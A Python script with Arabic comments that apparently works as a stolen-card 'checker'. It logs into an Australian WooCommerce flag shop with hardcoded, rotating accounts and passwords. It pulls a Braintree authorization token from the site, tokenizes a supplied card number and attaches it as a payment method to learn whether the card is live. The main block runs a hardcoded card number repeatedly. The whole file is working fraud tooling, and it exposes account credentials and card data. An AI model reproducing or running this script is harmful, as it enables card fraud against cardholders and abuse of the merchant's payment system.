import requests
import re
import base64
import uuid
import itertools

# ==================== قائمة الحسابات ====================
ACCOUNTS = [
    {'username': 'bubgmobile601@gmail.com', 'password': 'S10s20#s30'},
    {'username': 'zxcvgfdsaqwert12123@gmail.com', 'password': 'S10s20#s30'},
    {'username': 'plmnkomlpoknmlp@gmail.com', 'password': 'S10s20#s30'},
    {'username': 'sbhyjamryky@gmail.com', 'password': 'S10s20#s30'},  # حساب جديد
]

# مؤشر لتوزيع الحمل (Round Robin)
account_cycle = itertools.cycle(ACCOUNTS)
current_account_index = 0

def get_next_account():
    """جلب الحساب التالي في القائمة (Round Robin)"""
    global current_account_index
    account = ACCOUNTS[current_account_index % len(ACCOUNTS)]
    current_account_index += 1
    return account

def bra2(card_data, account=None):
    """
    فحص بطاقة على flagworld.com.au (Braintree - Auth)
    card_data: رقم|شهر|سنة|cvv
    account: إذا لم يتم تمرير حساب، يتم استخدام الحساب التالي تلقائياً
    """
    try:
        # اختيار الحساب (إذا لم يتم تحديد حساب، استخدم التالي)
        if account is None:
            account = get_next_account()
        
        username = account['username']
        password = account['password']
        
        # ===== تجزئة البطاقة =====
        card_data = card_data.strip()
        n = card_data.split("|")[0]
        mm = card_data.split("|")[1]
        yy = card_data.split("|")[2]
        cvc = card_data.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        session = requests.Session()
        
        # ===== 1. استخراج login nonce =====
        headers = {
            'authority': 'www.flagworld.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        response = session.get('https://www.flagworld.com.au/my-account/', headers=headers)
        
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not login_nonce:
            return "Declined"
        login_nonce = login_nonce.group(1)
        
        # ===== 2. تسجيل الدخول =====
        headers = {
            'authority': 'www.flagworld.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.flagworld.com.au',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = {
            'username': username,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        response = session.post('https://www.flagworld.com.au/my-account/', headers=headers, data=data)
        
        if 'wordpress_logged_in' not in str(session.cookies.get_dict()):
            return "Declined"
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        headers = {
            'authority': 'www.flagworld.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        response = session.get('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers)
        
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', response.text)
        if not client_nonce:
            return "Declined"
        client_nonce = client_nonce.group(1)
        
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            return "Declined"
        add_nonce = add_nonce.group(1)
        
        # ===== 4. الحصول على Authorization Fingerprint =====
        headers = {
            'authority': 'www.flagworld.com.au',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.flagworld.com.au',
            'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }
        response = session.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        enc_data = response.json().get('data')
        if not enc_data:
            return "Declined"
        
        dec_data = base64.b64decode(enc_data).decode('utf-8')
        auth_fp = re.search(r'"authorizationFingerprint":"(.*?)"', dec_data)
        if not auth_fp:
            return "Declined"
        auth_fp = auth_fp.group(1)
        
        # ===== 5. Tokenize البطاقة =====
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'authorization': f'Bearer {auth_fp}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy_full,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        
        try:
            payment_nonce = response.json()['data']['tokenizeCreditCard']['token']
        except:
            return "Declined"
        
        # ===== 6. إضافة البطاقة =====
        headers = {
            'authority': 'www.flagworld.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.flagworld.com.au',
            'referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = session.post('https://www.flagworld.com.au/my-account/add-payment-method/', headers=headers, data=data)
        text = response.text
        
        if 'Payment method successfully added' in text or 'Nice! New payment method added' in text:
            return '✅ Approved'
        elif 'Duplicate card exists in the vault' in text:
            return '✅ Approved (Duplicate)'
        else:
            error_match = re.search(r'<li>(.*?)</li>', text)
            if error_match:
                return f'❌ {error_match.group(1)}'
            return '❌ Declined'
        
    except Exception as e:
        return f'❌ Error: {str(e)}'


# ==================== دالة لاختيار حساب محدد يدوياً ====================
def bra2_with_account(card_data, account_index):
    """
    فحص بطاقة باستخدام حساب محدد
    account_index: 0, 1, 2 (حسب ترتيب الحسابات)
    """
    if account_index < 0 or account_index >= len(ACCOUNTS):
        return "❌ رقم الحساب غير صحيح"
    return bra2(card_data, account=ACCOUNTS[account_index])


# ==================== دالة لعرض الحسابات المتاحة ====================
def print_accounts():
    print("\n" + "="*50)
    print("📋 الحسابات المتاحة:")
    print("="*50)
    for i, acc in enumerate(ACCOUNTS):
        print(f"{i+1}. {acc['username']}")
    print("="*50 + "\n")


if __name__ == '__main__':
    print_accounts()
    
    # مثال: فحص بطاقة واحدة (سيتم التبديل بين الحسابات تلقائياً)
    card = "5294158321468738|12|2026|904"
    
    print("🔍 فحص 5 بطاقات (كل مرة بحساب مختلف):")
    for i in range(5):
        result = bra2(card)
        print(f"{i+1}. {result}")
    
    # أو استخدام حساب محدد:
    # result = bra2_with_account(card, 0)  # الحساب الأول
    # print(f"Result: {result}")